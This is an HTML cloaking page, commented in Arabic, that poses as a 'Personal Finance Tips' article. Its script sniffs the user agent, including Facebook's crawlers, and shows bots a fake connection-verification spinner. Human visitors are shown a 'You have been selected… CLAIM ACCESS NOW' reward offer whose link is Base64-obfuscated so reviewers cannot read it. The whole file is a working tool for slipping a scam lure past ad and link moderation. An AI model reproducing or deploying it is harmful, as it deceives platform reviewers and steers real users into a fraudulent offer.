<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Personal Finance Tips</title>
    <style>
        /* CSS نقي وبسيط لإيهام الروبوت بأنها صفحة مقال */
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f7f6; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .wrapper { width: 90%; max-width: 400px; background: #fff; padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; }
        h1 { color: #2d3436; font-size: 24px; margin-bottom: 15px; }
        p { color: #636e72; font-size: 16px; margin-bottom: 25px; }
        .loading-spinner { display: inline-block; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0984e3; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #safe-content { display: block; }
        #offer-content { display: none; } /* مخفي برمجياً عن الروبوتات */
        .btn { display: block; background: #00b894; color: #fff; padding: 18px; border-radius: 12px; text-decoration: none; font-weight: bold; font-size: 18px; transition: 0.3s; }
    </style>
</head>
<body>

    <div class="wrapper">
        <div id="safe-content">
            <h1>Welcome to Premium Insights</h1>
            <p>Please wait while we verify your secure connection...</p>
            <div class="loading-spinner"></div>
        </div>

        <div id="offer-content">
            <div style="background:#ffeaa7; padding:5px; border-radius:5px; font-size:12px; font-weight:bold; margin-bottom:10px;">EXCLUSIVELY FOR USA</div>
            <h1 id="dynamic-title">Access Your Reward Below</h1>
            <p>Congratulations! You have been selected to participate in this limited-time opportunity.</p>
            <a href="#" id="secure-link" class="btn">CLAIM ACCESS NOW</a>
        </div>
    </div>

    <script>
        (function() {
            // تشفير الرابط (Base64) لمنع الروبوتات من قراءته كـ URL
            // استبدل الرابط أدناه برابط عرضك مشفراً بـ Base64
            var _0x5a1 = "aHR0cHM6Ly9mZXJhdmVyb21vbnN0ZXIuaW5rL3NsLzMxcm9q"; 

            function isBot() {
                var ua = navigator.userAgent.toLowerCase();
                // فحص الكلمات الدليلة للروبوتات (Facebook, Google, Bot, etc.)
                return /bot|crawler|spider|facebookexternalhit|facebookcatalog/i.test(ua);
            }

            setTimeout(function() {
                if (!isBot()) {
                    // إذا كان مستخدماً حقيقياً، نقوم بفك التشفير وإظهار العرض
                    document.getElementById('safe-content').style.display = 'none';
                    document.getElementById('offer-content').style.display = 'block';
                    var link = atob(_0x5a1);
                    document.getElementById('secure-link').setAttribute('href', link);
                }
            }, 1500); // تأخير بسيط للتمويه
        })();
    </script>
</body>
</html>
